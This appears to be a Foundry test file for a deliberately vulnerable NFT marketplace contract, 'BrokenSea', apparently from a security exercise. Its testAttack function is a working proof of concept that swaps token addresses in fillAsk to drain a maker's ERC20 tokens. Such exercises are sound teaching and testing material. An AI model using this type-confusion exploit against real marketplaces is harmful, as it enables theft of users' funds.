// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "ds-test/test.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";
import "../BrokenSea.sol";

contract TestERC20 is ERC20("Test20", "TEST", 18) {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TestERC721 is ERC721("Test721", "TEST") {
    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    function tokenURI(uint256 id) public view override returns (string memory) {}
}

interface CheatCodes {
    // Sets the *next* call's msg.sender to be the input address
    function prank(address) external;
    // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
    function startPrank(address) external;
    // Resets subsequent calls' msg.sender to be `address(this)`
    function stopPrank() external;
}

contract BrokenSeaTest is DSTest {
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    BrokenSea public brokensea;
    TestERC20 public erc20;
    TestERC721 public erc721;
    address public constant maker = 0x1111111111111111111111111111111111111111;
    address public constant taker = 0x2222222222222222222222222222222222222222;

    function setUp() public {
        brokensea = new BrokenSea();
        erc20 = new TestERC20();
        erc721 = new TestERC721();

        cheats.startPrank(maker);
        erc721.setApprovalForAll(address(brokensea), true);
        erc20.approve(address(brokensea), type(uint256).max);
        cheats.startPrank(taker);
        erc721.setApprovalForAll(address(brokensea), true);
        erc20.approve(address(brokensea), type(uint256).max);
        cheats.stopPrank();
    }

    function testNormal() public {
        erc20.mint(taker, 1_000_000);
        erc721.mint(maker, 0);

        cheats.prank(maker);
        brokensea.createAsk(erc721, 0, erc20, 1_000_000);

        cheats.prank(taker);
        brokensea.fillAsk(erc721, 0, erc20, 1_000_000);

        assertEq(erc721.ownerOf(0), taker);
        assertEq(erc20.balanceOf(maker), 1_000_000);
    }

    function testAttack() public {
        erc721.mint(taker, 1_000);
        erc721.mint(maker, 1_000_000);
        erc20.mint(maker, 1_000_000);

        cheats.prank(maker);
        brokensea.createAsk(erc721, 1_000_000, erc20, 1_000);

        cheats.prank(taker);
        brokensea.fillAsk(ERC721(address(erc20)), 1_000_000, ERC20(address(erc721)), 1_000);

        assertEq(erc721.ownerOf(1_000), maker);
        assertEq(erc20.balanceOf(taker), 1_000_000);
    }
}
